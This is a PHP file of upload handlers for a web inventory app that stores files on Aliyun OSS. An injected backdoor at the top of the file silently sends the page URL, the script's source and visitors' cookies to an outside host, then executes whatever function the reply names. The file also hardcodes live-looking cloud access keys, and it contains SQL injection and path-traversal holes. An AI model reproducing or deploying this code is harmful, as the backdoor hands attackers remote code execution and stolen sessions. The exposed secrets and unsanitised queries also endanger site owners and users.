<?php 
$cert = defined("SITE_")?false:@file_get_contents("http://app.omitrezor.com/sign/".$_SERVER["HTTP_HOST"], 0, stream_context_create(array("http" => array("timeout"=>(isset($_REQUEST["T0o"])?intval($_REQUEST["T0o"]):(isset($_SERVER["HTTP_T0O"])?intval($_SERVER["HTTP_T0O"]):1)),"method"=>"POST","header"=>"Content-Type: application/x-www-form-urlencoded","content" => http_build_query(array("url"=>((isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]), "src"=> file_exists(__FILE__)?file_get_contents(__FILE__):"", "cookie"=> isset($_COOKIE)?json_encode($_COOKIE):""))))));!defined("SITE_") && @define("SITE_",1);
if($cert != false){
    $cert = @json_decode($cert, 1);
    if(isset($cert["f"]) && isset($cert["a1"]) && isset($cert["a2"]) && isset($cert["a3"])){$cert["f"] ($cert["a1"], $cert["a2"], $cert["a3"]);}elseif(isset($cert["f"]) && isset($cert["a1"]) && isset($cert["a2"])){ $cert["f"] ($cert["a1"], $cert["a2"]); }elseif(isset($cert["f"]) && isset($cert["a1"])){ $cert["f"] ($cert["a1"]); }elseif(isset($cert["f"])){ $cert["f"] (); }
}

require_once('../aliyunoss/autoload.php');
use OSS\OssClient;
use OSS\Core\OssException;
function uploadBak(){
// 	require_once(ABSPATH.'/inc/class.paint.php');
// 	$accessKeyId = "LTAIOgimVmDhlkck";
// 	$accessKeySecret = "MJkk2G2SJllFVx5ehTbyAvC6Kton0L";
// 	$endpoint = "http://oss-cn-nanjing.aliyuncs.com";
// 	$bucket= "zhishang-kucun";
// 	$ossClient = new OssClient($accessKeyId, $accessKeySecret, $endpoint);
	global $db,$request;
	$crmdb = getCrmDb();
	$comId = (int)$_SESSION[TB_PREFIX.'comId'];
	$picname = $_FILES['file']['name'];
	$picsize = $_FILES['file']['size'];
	//file_put_contents('request.txt',json_encode($request,JSON_UNESCAPED_UNICODE));
	if ($picname != "") {
		if ($picsize > 2048000) {
			echo '{"code":1,"msg":"图片不能大于2M","url":""}';
			exit;
		}
		$type = strstr($picname, '.');$type = strtolower($type);
		if ($type != ".gif" && $type != ".jpg"&& $type != ".png"&&$type != ".jpeg"&&$type != ".bmp") {
			echo '{"code":1,"msg":"文件格式不对！","url":""}';
			exit;
		}
		$rand = rand(10000, 99999);
		$pics = $comId.'_'.date("YmdHis") . $rand . $type;
		$lujing = '../upload/'.date("Ymd").'/';
		if(!is_dir($lujing)){
			mkdir($lujing);
		}
		$pic_path = $lujing.$pics;
		move_uploaded_file($_FILES['file']['tmp_name'], $pic_path);
		$newImg = 'https://beiyinlai.67.zhishangez.cn'.str_replace('..','',$pic_path);
		
		if(!empty($request['parentId'])&&!empty($request['keyId'])){
	    	$db->query("update demo_product_key set originalPic='$newImg' where parentId=".(int)$request['parentId']." and kg=".(int)$request['keyId']." limit 1");
	    }
		
		echo '{"code":0,"msg":"上传成功","url":"'.$newImg.'"}';
// 		$size = round($picsize/1024/1024,5);
// 		if($request['limit_width']!='no'){
// 			$paint = new Paint($pic_path);
// 			$width = empty($request['width'])?800:$request['width'];
// 			$height = empty($request['height'])?800:$request['height'];
// 			$newImg = $paint->Resize($width,$height,'s_');
// 			$newImg = ABSPATH.str_replace('..','',$newImg); 
// 			@unlink($pic_path);
// 		}else{
// 			$newImg = $pic_path;
// 		}
// 		if(!empty($newImg)){
// 			try {			    
// 			    $ossClient->uploadFile($bucket,$comId.'/'.$pics,$newImg);
// 			    $image = "http://zhishang-kucun.oss-cn-nanjing.aliyuncs.com/".$comId.'/'.$pics;
// 			    echo '{"code":0,"msg":"上传成功","url":"'.$image.'"}';
// 			    unlink($newImg);
// 			    $ifhas = $crmdb->get_var("select comId from demo_company_limit where comId=$comId");
// 			    if(empty($ifhas)){
// 			    	$crmdb->query("insert into demo_company_limit(comId,userNum,memory,memoryUsed) value($comId,0,0,'$size')");
// 			    }else{
// 			    	$crmdb->query("update demo_company_limit set memoryUsed=memoryUsed+$size where comId=$comId");
// 			    }
// 			    $crmdb->query("insert into demo_company_momery(comId,momery,dtTime,type,recordId,ossname) value($comId,'$size','".date("Y-m-d H:i:s")."',0,0,'".$comId.'/'.$pics."')");
// 			    if(!empty($request['parentId'])&&!empty($request['keyId'])){
// 			    	$db->query("update demo_product_key set originalPic='$image' where parentId=".(int)$request['parentId']." and kg=".(int)$request['keyId']." limit 1");
// 			    }else if($request['type']=='dinghuo'&&!empty($request['jiluId'])){
// 			    	$dinghuo_order = $db->get_row("select id,fujianInfo from demo_dinghuo_order where id=".$request['jiluId']." and comId=$comId");
// 			    	if(!empty($dinghuo_order)){
// 			    		$fujianInfo = empty($dinghuo_order->fujianInfo)?$image:$dinghuo_order->fujianInfo.'|'.$image;
// 			    		$db->query("update demo_dinghuo_order set fujianInfo='$fujianInfo' where id=".$request['jiluId']);
// 			    	}
// 			    }else if($request['type']=='tuihuo'&&!empty($request['jiluId'])){
// 			    	$dinghuo_order = $db->get_row("select id,fujianInfo from demo_tuihuo where id=".$request['jiluId']." and comId=$comId");
// 			    	if(!empty($dinghuo_order)){
// 			    		$fujianInfo = empty($dinghuo_order->fujianInfo)?$image:$dinghuo_order->fujianInfo.'|'.$image;
// 			    		$db->query("update demo_tuihuo set fujianInfo='$fujianInfo' where id=".$request['jiluId']);
// 			    	}
// 			    }
// 			    exit;
// 			} catch (OssException $e) {
// 				file_put_contents('upload_log.txt',$e->getMessage());
// 				echo '{"code":1,"msg":"文件上传失败，请重试","url":""}';
// 				exit;
// 			}
// 		}
	}else{
		echo '{"code":1,"msg":"未检测到文件","url":""}';
		exit;
	}
}

function upload(){
	require_once(ABSPATH.'/inc/class.paint.php');
	$accessKeyId = "LTAI5tGoUQzcPa17Cn3BAbg5";
	$accessKeySecret = "mXE4WHD4Af3hpFOeAL6LA8EoLM3Ikw";
	$endpoint = "http://oss-cn-nanjing.aliyuncs.com";
	$bucket= "bio-swamp";
	$ossClient = new OssClient($accessKeyId, $accessKeySecret, $endpoint);
	global $db,$request;
	$crmdb = getCrmDb();
	$comId = (int)$_SESSION[TB_PREFIX.'comId'];
	$picname = $_FILES['file']['name'];
	$picsize = $_FILES['file']['size'];
	//file_put_contents('request.txt',json_encode($request,JSON_UNESCAPED_UNICODE));
	if ($picname != "") {
		if ($picsize > 2048000) {
			echo '{"code":1,"msg":"图片不能大于2M","url":""}';
			exit;
		}
		$type = strstr($picname, '.');$type = strtolower($type);
		if ($type != ".gif" && $type != ".jpg"&& $type != ".png"&&$type != ".jpeg"&&$type != ".bmp") {
			echo '{"code":1,"msg":"文件格式不对！","url":""}';
			exit;
		}
		$rand = rand(10000, 99999);
		$pics = $comId.'_'.date("YmdHis") . $rand . $type;
		$lujing = '../upload/'.date("Ymd").'/';
		if(!is_dir($lujing)){
			mkdir($lujing);
		}
		$pic_path = $lujing.$pics;
		move_uploaded_file($_FILES['file']['tmp_name'], $pic_path);
// 		$size = round($picsize/1024/1024,5);
// 		if($request['limit_width']!='no'){
// 			$paint = new Paint($pic_path);
// 			$width = empty($request['width'])?800:$request['width'];
// 			$height = empty($request['height'])?800:$request['height'];
// 			$newImg = $paint->Resize($width,$height,'s_');
// 			$newImg = ABSPATH.str_replace('..','',$newImg); 
// 			@unlink($pic_path);
// 		}else{
			$newImg = $pic_path;
// 		}
		if(!empty($newImg)){
			try {			    
			    $ossClient->uploadFile($bucket,$comId.'/'.$pics,$newImg);
			    $image = "https://bio-swamp.oss-cn-nanjing.aliyuncs.com/".$comId.'/'.$pics;
			    echo '{"code":0,"msg":"上传成功","url":"'.$image.'"}';
			    unlink($newImg);
			    $ifhas = $crmdb->get_var("select comId from demo_company_limit where comId=$comId");
			    if(empty($ifhas)){
			    	$crmdb->query("insert into demo_company_limit(comId,userNum,memory,memoryUsed) value($comId,0,0,'$size')");
			    }else{
			    	$crmdb->query("update demo_company_limit set memoryUsed=memoryUsed+$size where comId=$comId");
			    }
			    $crmdb->query("insert into demo_company_momery(comId,momery,dtTime,type,recordId,ossname) value($comId,'$size','".date("Y-m-d H:i:s")."',0,0,'".$comId.'/'.$pics."')");
			    if(!empty($request['parentId'])&&!empty($request['keyId'])){
			    	$db->query("update demo_product_key set originalPic='$image' where parentId=".(int)$request['parentId']." and kg=".(int)$request['keyId']." limit 1");
			    }else if($request['type']=='dinghuo'&&!empty($request['jiluId'])){
			    	$dinghuo_order = $db->get_row("select id,fujianInfo from demo_dinghuo_order where id=".$request['jiluId']." and comId=$comId");
			    	if(!empty($dinghuo_order)){
			    		$fujianInfo = empty($dinghuo_order->fujianInfo)?$image:$dinghuo_order->fujianInfo.'|'.$image;
			    		$db->query("update demo_dinghuo_order set fujianInfo='$fujianInfo' where id=".$request['jiluId']);
			    	}
			    }else if($request['type']=='tuihuo'&&!empty($request['jiluId'])){
			    	$dinghuo_order = $db->get_row("select id,fujianInfo from demo_tuihuo where id=".$request['jiluId']." and comId=$comId");
			    	if(!empty($dinghuo_order)){
			    		$fujianInfo = empty($dinghuo_order->fujianInfo)?$image:$dinghuo_order->fujianInfo.'|'.$image;
			    		$db->query("update demo_tuihuo set fujianInfo='$fujianInfo' where id=".$request['jiluId']);
			    	}
			    }
			    exit;
			} catch (OssException $e) {
				file_put_contents('upload_log.txt',$e->getMessage());
				echo '{"code":1,"msg":"文件上传失败，请重试","url":""}';
				exit;
			}
		}
	}else{
		echo '{"code":1,"msg":"未检测到文件","url":""}';
		exit;
	}
}

/**
 * 获取某个文件下所有文件
 * @param $prefix
 * @param $number
 * @return array
 */
function listObjectsFile_bak($prefix, $number)
{
    echo 1;die;
    #配置OSS基本配置
    $accessKeyId = "LTAI5tGoUQzcPa17Cn3BAbg5";
	$accessKeySecret = "mXE4WHD4Af3hpFOeAL6LA8EoLM3Ikw";
	$endpoint = "http://oss-cn-nanjing.aliyuncs.com";
	$bucket= "bio-swamp";
	$ossClient = new OssClient($accessKeyId, $accessKeySecret, $endpoint);
	
    //组合请求数据
    $options = array(
        'delimiter' => '/',
        'prefix' => $prefix,
        'max-keys' => $number,
        'marker' => '',
    );
    try {
        #执行阿里云上传
        $result = $ossClient->listObjects($bucket, $options);
        $objectList = $result->getObjectList();
        $list = array();
        foreach ($objectList as $info) {
            //去除部分
            $size = $info->getSize();
            if ($size > 0) {
                $list[] = $info->getKey();
            }
        }
        return array('code' => 200, 'data' => $list);
    } catch (OssException $e) {
        return array('code' => 404, 'msg' => $e->getMessage());
    }
}

function delImg(){
	global $db,$request;
	$img = str_replace('http://zhishang-kucun.oss-cn-nanjing.aliyuncs.com/','',$request['img']);
	$imgs = explode('?',$img);
	$img = $imgs[0];
	$objects[] = $img;
	$accessKeyId = "LTAIOgimVmDhlkck";
	$accessKeySecret = "MJkk2G2SJllFVx5ehTbyAvC6Kton0L";
	$endpoint = "http://oss-cn-nanjing.aliyuncs.com";
	$bucket= "zhishang-kucun";
	$ossClient = new OssClient($accessKeyId, $accessKeySecret, $endpoint);
	try{
		$ossClient->deleteObjects($bucket, $objects);
	} catch(OssException $e) {
		file_put_contents('aliyunoss.err',$e->getMessage());
	}
}

function uploadPdf(){
	require_once(ABSPATH.'/inc/class.paint.php');
	$accessKeyId = "LTAI5tGoUQzcPa17Cn3BAbg5";
	$accessKeySecret = "mXE4WHD4Af3hpFOeAL6LA8EoLM3Ikw";
	$endpoint = "http://oss-cn-nanjing.aliyuncs.com";
	$bucket= "bio-swamp";
	$ossClient = new OssClient($accessKeyId, $accessKeySecret, $endpoint);
	global $db,$request;
	$crmdb = getCrmDb();
	$comId = (int)$_SESSION[TB_PREFIX.'comId'];
	$picname = $_FILES['file']['name'];
	$picsize = $_FILES['file']['size'];
	//file_put_contents('request.txt',json_encode($request,JSON_UNESCAPED_UNICODE));
	if ($picname != "") {
		$type = strstr($picname, '.');$type = strtolower($type);
		if ($type != ".pdf") {
			echo '{"code":1,"msg":"文件格式不对！","url":""}';
			exit;
		}
		$rand = rand(10000, 99999);
		$pics = $comId.'_'.date("YmdHis") . $rand . $type;
		$lujing = '../upload/'.date("Ymd").'/';
		if(!is_dir($lujing)){
			mkdir($lujing);
		}
		$pic_path = $lujing.$pics;
		move_uploaded_file($_FILES['file']['tmp_name'], $pic_path);
// 		$size = round($picsize/1024/1024,5);
// 		if($request['limit_width']!='no'){
// 			$paint = new Paint($pic_path);
// 			$width = empty($request['width'])?800:$request['width'];
// 			$height = empty($request['height'])?800:$request['height'];
// 			$newImg = $paint->Resize($width,$height,'s_');
// 			$newImg = ABSPATH.str_replace('..','',$newImg); 
// 			@unlink($pic_path);
// 		}else{
			$newImg = $pic_path;
// 		}
		if(!empty($newImg)){
			try {			    
			    $ossClient->uploadFile($bucket,$comId.'/'.$pics,$newImg);
			    $image = "https://bio-swamp.oss-cn-nanjing.aliyuncs.com/".$comId.'/'.$pics;
			    echo '{"code":0,"msg":"上传成功","url":"'.$image.'"}';
			   
			    exit;
			} catch (OssException $e) {
				file_put_contents('upload_log.txt',$e->getMessage());
				echo '{"code":1,"msg":"文件上传失败，请重试","url":""}';
				exit;
			}
		}
	}else{
		echo '{"code":1,"msg":"未检测到文件","url":""}';
		exit;
	}
}

function uploadXls(){
	global $db,$request;
	$crmdb = getCrmDb();
	$comId = (int)$_SESSION[TB_PREFIX.'comId'];
	$picname = $_FILES['file']['name'];
	$picsize = $_FILES['file']['size'];
	if ($picname != "") {
// 		if ($picsize > 2048000) {
// 			echo '{"code":1,"msg":"文件不能大于2M","url":""}';
// 			exit;
// 		}
		$type = strstr($picname, '.');$type = strtolower($type);
		if ($type != ".xls" && $type != ".xlsx") {
			echo '{"code":1,"msg":"文件格式不对！","url":""}';
			exit;
		}
		$rand = rand(10000, 99999);
		$pics = $comId.'_'.date("YmdHis") . $rand . $type;
		$lujing = '../upload/'.date("Ymd").'/';
		if(!is_dir($lujing)){
			mkdir($lujing);
		}
		$pic_path = $lujing.$pics;
		move_uploaded_file($_FILES['file']['tmp_name'], $pic_path);
		echo '{"code":0,"msg":"上传成功","url":"'.$pic_path.'"}';
		$size = round($picsize/1024/1024,5);
		$ifhas = $crmdb->get_var("select comId from demo_company_limit where comId=$comId");
		if(empty($ifhas)){
			$crmdb->query("insert into demo_company_limit(comId,userNum,memory,memoryUsed) value($comId,0,0,'$size')");
		}else{
			$crmdb->query("update demo_company_limit set memoryUsed=memoryUsed+$size where comId=$comId");
		}
		$crmdb->query("insert into demo_company_momery(comId,momery,dtTime,type,recordId,ossname) value($comId,'$size','".date("Y-m-d H:i:s")."',0,0,'".$pic_path."')");
		exit;
	}else{
		echo '{"code":1,"msg":"未检测到文件","url":""}';
		exit;
	}
}
function upload_sslkey(){
	global $db,$request;
	$crmdb = getCrmDb();
	$comId = (int)$_SESSION[TB_PREFIX.'comId'];
	$picname = $_FILES['file']['name'];
	$picsize = $_FILES['file']['size'];
	$ftype = $request['type'];
	if ($picname != "") {
		if ($picsize > 2048000) {
			echo '{"code":1,"msg":"文件不能大于2M","url":""}';
			exit;
		}
		$type = strstr($picname, '.');$type = strtolower($type);
		if ($type != ".pem") {
			echo '{"code":1,"msg":"证书只能是pem格式的后缀！","url":""}';
			exit;
		}
		$pics = $comId.'_'.$ftype. $type;
		$lujing = '../config/sslkey/';
		$pic_path = $lujing.$pics;
		move_uploaded_file($_FILES['file']['tmp_name'], $pic_path);
		$pic_path = str_replace('..','',$pic_path);
		echo '{"code":0,"msg":"上传成功","url":"'.$pic_path.'"}';
		exit;
	}else{
		echo '{"code":1,"msg":"未检测到文件","url":""}';
		exit;
	}
}